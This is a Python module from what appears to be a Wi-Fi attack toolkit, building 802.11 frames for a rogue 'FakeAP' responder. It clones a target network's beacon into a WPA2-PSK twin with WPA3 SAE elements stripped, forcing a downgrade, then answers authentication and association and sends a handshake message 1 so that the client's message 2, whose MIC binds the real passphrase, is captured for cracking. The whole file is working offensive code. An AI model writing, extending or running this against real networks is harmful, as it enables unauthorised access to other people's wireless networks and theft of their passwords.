"""AP-side 802.11 response builders for the FakeAP responder (802.11 spec, no I/O).

``beacon_clone`` rewrites a captured beacon to a WPA2-only PSK twin (SAE stripped) on the decoy
channel; ``auth_resp`` / ``assoc_resp`` / ``eapol_m1`` answer auth/assoc then open the 4-way with
our ANonce so the client's M2 (its MIC binds the real PSK) is captured.
"""
import struct
from typing import Optional

from wifit3.dot11.ie import (
    GENERIC_RSN_IE, ds_param_ie, ext_rates_ie, force_psk_akm,
    iter_information_elements, rates_ie,
)
from wifit3.dot11.eapol import data_header, eapol_key, LLC_SNAP_EAPOL
from wifit3.dot11.mac import mac_header

_CAP_ESS_PRIVACY = 0x0011
_BEACON_HEAD = 36               # 24B MAC header + 12B fixed (timestamp, interval, capability)
_ELEMID_DS = 0x03
_ELEMID_RSN = 0x30
_ELEMID_HT_OP = 0x3D           # 61 HT Operation (primary channel + secondary-channel offset)
_ELEMID_VHT_OP = 0xC0          # 192 VHT Operation (channel width + center-frequency segments)
_ELEMID_RSNXE = 0xF4            # RSN Extended Caps: SAE hash-to-element, MFP-required advert
_ELEMID_HT_CAP = 0x2D           # 45 HT Capabilities
_ELEMID_EXT = 0xFF
_ELEMID_VENDOR = 0xDD
_WMM_OUI_TYPE = b"\x00\x50\xf2\x02"
_HT_CAP_40MHZ = 0x02            # HT Capabilities Info: Supported Channel Width Set
_AID_FIELD_BITS = 0xC000        # 802.11: the AID field's two MSBs are set
_ELEMID_RM_ENABLED_CAP = 0x46   # 70
_ELEMID_VHT_CAP = 0xBF          # 191
_ELEMID_EXT_CAP = 0x7F          # 127 Extended Capabilities
_EXTID_HE_CAP = 35
_EXTID_HE_OP = 36
_EXTID_BSS_COLOR_CCA = 42
_EXTID_SPATIAL_REUSE = 39
_EXTID_MU_EDCA = 38
_EXTID_EHT_CAP = 108
_EXTID_EHT_OP = 106
# (Element ID, Element ID Extension) a (re)assoc response copies from the twin beacon, in hostapd's
# send_assoc_resp order.
_ASSOC_RESP_ELEMENTS = (
    (_ELEMID_RM_ENABLED_CAP, None), (_ELEMID_HT_CAP, None), (_ELEMID_HT_OP, None),
    (_ELEMID_VHT_CAP, None), (_ELEMID_VHT_OP, None),
    (_ELEMID_EXT, _EXTID_HE_CAP), (_ELEMID_EXT, _EXTID_HE_OP), (_ELEMID_EXT, _EXTID_BSS_COLOR_CCA),
    (_ELEMID_EXT, _EXTID_SPATIAL_REUSE), (_ELEMID_EXT, _EXTID_MU_EDCA), (_ELEMID_EXT_CAP, None),
    (_ELEMID_EXT, _EXTID_EHT_CAP), (_ELEMID_EXT, _EXTID_EHT_OP),
)
_M1_KEY_INFO = 0x008A          # Pairwise + Key ACK + key descriptor version 2 (HMAC-SHA1, PSK)
_CCMP_KEY_LEN = 16


def _resp_header(fc: bytes, bssid: bytes, client: bytes) -> bytes:
    return mac_header(fc, client, bssid, bssid)


def auth_resp(bssid: bytes, client: bytes, algorithm: int = 0, status: int = 0) -> bytes:
    """Authentication response: ``algorithm``, sequence 2, ``status``."""
    return _resp_header(b"\xb0\x00", bssid, client) + struct.pack("<HHH", algorithm, 2, status)


def assoc_resp(bssid: bytes, client: bytes, aid: int = 1, channel: int = 1, status: int = 0,
               reassoc: bool = False, twin_beacon: bytes = b"") -> bytes:
    """(Re)Association Response: ESS+Privacy capability, ``status``, AID, band-aware rates, then
    the HT/VHT/HE/EHT/WMM elements of ``twin_beacon``."""
    body = (struct.pack("<HHH", _CAP_ESS_PRIVACY, status, aid | _AID_FIELD_BITS)
            + rates_ie(channel) + ext_rates_ie(channel) + _assoc_resp_elements(twin_beacon))
    return _resp_header(b"\x30\x00" if reassoc else b"\x10\x00", bssid, client) + body


def _assoc_resp_elements(twin_beacon: bytes) -> bytes:
    found: dict[tuple[int, Optional[int]], bytes] = {}
    wmm = b""
    for tag_id, body, elem in iter_information_elements(twin_beacon, _BEACON_HEAD):
        if tag_id == _ELEMID_VENDOR and body[:4] == _WMM_OUI_TYPE:
            wmm = elem
        elif tag_id == _ELEMID_HT_CAP and body:
            found[(tag_id, None)] = elem[:2] + bytes([body[0] & ~_HT_CAP_40MHZ & 0xFF]) + body[1:]
        elif tag_id == _ELEMID_EXT and body:
            found[(tag_id, body[0])] = elem
        else:
            found[(tag_id, None)] = elem
    return b"".join(found.get(key, b"") for key in _ASSOC_RESP_ELEMENTS) + wmm


def eapol_m1(bssid: bytes, client: bytes, anonce: bytes, replay: int = 1) -> bytes:
    """4-way message 1 (AP->client): our ANonce, no MIC."""
    payload = eapol_key(key_info=_M1_KEY_INFO, key_len=_CCMP_KEY_LEN, replay=replay, nonce=anonce)
    return data_header(to_ds=False, bssid=bssid, client=client) + LLC_SNAP_EAPOL + payload


def _ht_op_to_channel(elem: bytes, channel: int) -> bytes:
    body = bytearray(elem[2:])
    if len(body) >= 2:
        body[0] = channel & 0xFF          # primary channel
        body[1] &= ~0x07                  # clear secondary-offset (bits 0-1) + STA width (bit 2)
    return elem[:2] + bytes(body)


def _vht_op_to_20mhz(elem: bytes) -> bytes:
    body = bytearray(elem[2:])
    if len(body) >= 3:
        body[0] = 0                       # channel width 0 = 20/40 MHz
        body[1] = 0                       # center-freq seg 0
        body[2] = 0                       # center-freq seg 1
    return elem[:2] + bytes(body)


def beacon_clone(real_beacon: bytes, decoy_channel: int, bssid: Optional[bytes] = None) -> bytes:
    """The target's beacon rewritten to a WPA2-PSK twin. ``bssid`` rewrites Addr2/Addr3."""
    if len(real_beacon) < _BEACON_HEAD:
        raise ValueError(f"beacon too short to rewrite: {len(real_beacon)} bytes")
    head = bytearray(real_beacon[:_BEACON_HEAD])
    head[22:24] = b"\x00\x00"
    if bssid is not None:
        head[10:16] = bssid          # Addr2 (SA)
        head[16:22] = bssid          # Addr3 (BSSID)
    tags = real_beacon[_BEACON_HEAD:]
    kept = bytearray()
    for tag_id, _body, elem in iter_information_elements(tags):
        if tag_id == _ELEMID_RSN:
            kept += force_psk_akm(elem) or GENERIC_RSN_IE
        elif tag_id == _ELEMID_DS:
            kept += ds_param_ie(decoy_channel)
        elif tag_id == _ELEMID_HT_OP:
            kept += _ht_op_to_channel(elem, decoy_channel)
        elif tag_id == _ELEMID_VHT_OP:
            kept += _vht_op_to_20mhz(elem)
        elif tag_id != _ELEMID_RSNXE:
            kept += elem
    return bytes(head) + bytes(kept)
